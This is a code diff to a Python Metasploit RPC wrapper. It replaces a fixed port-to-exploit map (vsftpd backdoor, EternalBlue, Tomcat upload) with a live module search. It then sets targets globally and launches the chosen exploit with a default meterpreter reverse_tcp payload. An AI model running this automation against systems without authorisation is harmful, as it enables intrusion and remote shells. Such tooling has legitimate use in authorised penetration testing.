@@ -138,13 +138,11 @@ class MetasploitRPCEngine:
                 msf_console = self.client.consoles.console()
                 msf_console.write(f"search {keyword}\n")
 
-                # Buffer time for the massive search query
                 time.sleep(3)
                 output = msf_console.read()
 
                 if output and output.get('data'):
                     data = output['data']
-                    # Strip the extreme length of default msfconsole output to keep it clean
                     lines = data.split('\n')
                     if len(lines) > 50:
                         data = '\n'.join(
@@ -159,7 +157,7 @@ class MetasploitRPCEngine:
                 console.print(f"[red][!] Search failed: {e}[/red]")
 
     def auto_exploit(self):
-        """Silently configures and launches an exploit via Virtual Console API."""
+        """Pro Tier: Dynamically queries the MSF DB based on the port and auto-suggests the best exploits."""
         default_rhost = ctx.get("RHOST") or "192.168.1.1"
         default_lhost = ctx.get("LHOST") or "127.0.0.1"
 
@@ -177,20 +175,83 @@ class MetasploitRPCEngine:
         lhost = questionary.text(
             "Your IP (LHOST):", default=default_lhost, style=Q_STYLE).ask()
 
-        port_exploits = {
-            21: "unix/ftp/vsftpd_234_backdoor",
-            22: "linux/ssh/exim_pe_injection",
-            80: "multi/http/apache_normalize_path_rce",
-            445: "windows/smb/ms17_010_eternalblue",
-            8080: "multi/http/tomcat_mgr_upload"
-        }
+        # --- PRO FEATURE: Dynamic Intelligence Engine ---
+        suggested_modules = []
+        raw_data = ""
 
-        module_name = port_exploits.get(rport, "multi/handler")
-        custom_mod = questionary.text(
-            f"Exploit Module (Default: {module_name}):", default=module_name, style=Q_STYLE).ask()
+        try:
+            msf_console = self.client.consoles.console()
+            msf_console.write(f"search port:{rport} type:exploit\n")
+
+            with console.status(f"[bold cyan]Querying Metasploit DB for exploits on Port {rport}...[/bold cyan]", spinner="dots"):
+                # Poll the console to capture the search table
+                for _ in range(5):
+                    time.sleep(1)
+                    out = msf_console.read()
+                    if out and out.get('data'):
+                        raw_data += out['data']
+                        if "Matching Modules" in raw_data or "No results" in raw_data:
+                            time.sleep(1)  # Let the table finish printing
+                            out = msf_console.read()
+                            if out and out.get('data'):
+                                raw_data += out['data']
+                            break
+
+            if raw_data:
+                lines = raw_data.splitlines()
+                display_lines = []
+
+                # Parse the MSF output table
+                for line in lines:
+                    # Keep Headers and Separators
+                    if "Name" in line and "Disclosure" in line:
+                        display_lines.append(line)
+                    elif "----" in line or "====" in line:
+                        display_lines.append(line)
+                    # Extract exploit rows and grab their paths
+                    elif "exploit/" in line:
+                        display_lines.append(line)
+                        parts = line.split()
+                        for p in parts:
+                            if p.startswith("exploit/"):
+                                suggested_modules.append(p)
+                                break
+
+                if suggested_modules:
+                    # Print the nice table showing Ranks (Excellent, Good, etc)
+                    console.print(Panel("\n".join(
+                        display_lines[:25]), title=f"Top Vulnerabilities for Port {rport}", border_style="green"))
+                    if len(display_lines) > 25:
+                        console.print(
+                            "[dim]... [Truncated. Showing top results only] ...[/dim]")
+                else:
+                    console.print(
+                        f"[yellow][-] No direct port-matched exploits found for {rport} in the MSF Database.[/yellow]")
+        except Exception as e:
+            console.print(f"[dim red]Module search error: {e}[/dim red]")
+
+        # --- DYNAMIC DROPDOWN SELECTION ---
+        custom_mod = ""
+        if suggested_modules:
+            choices = suggested_modules[:15] + \
+                [questionary.Separator(), "Manual Entry (Type it yourself)"]
+            custom_mod = questionary.select(
+                "Select Exploit Module from DB:",
+                choices=choices,
+                style=Q_STYLE
+            ).ask()
+
+            if custom_mod == "Manual Entry (Type it yourself)":
+                custom_mod = questionary.text(
+                    "Enter Exploit Module (e.g., exploit/windows/smb/ms17_010_eternalblue):", style=Q_STYLE).ask()
+        else:
+            custom_mod = questionary.text(
+                "Enter Exploit Module manually:", style=Q_STYLE).ask()
+
         if not custom_mod:
             return
 
+        # Smart default payload guessing based on the chosen module
         default_payload = "windows/x64/meterpreter/reverse_tcp"
         if "unix" in custom_mod or "linux" in custom_mod or "apache" in custom_mod:
             default_payload = "cmd/unix/interact"
@@ -227,10 +288,10 @@ class MetasploitRPCEngine:
 
         try:
             msf_console = self.client.consoles.console()
-
             msf_console.write(f"use {custom_mod}\n")
             time.sleep(0.5)
 
+            # Use SETG (Set Global) to silently force variables into the MSF memory space.
             msf_console.write(f"setg RHOSTS {target}\n")
             msf_console.write(f"setg RHOST {target}\n")
             msf_console.write(f"setg RPORT {rport}\n")
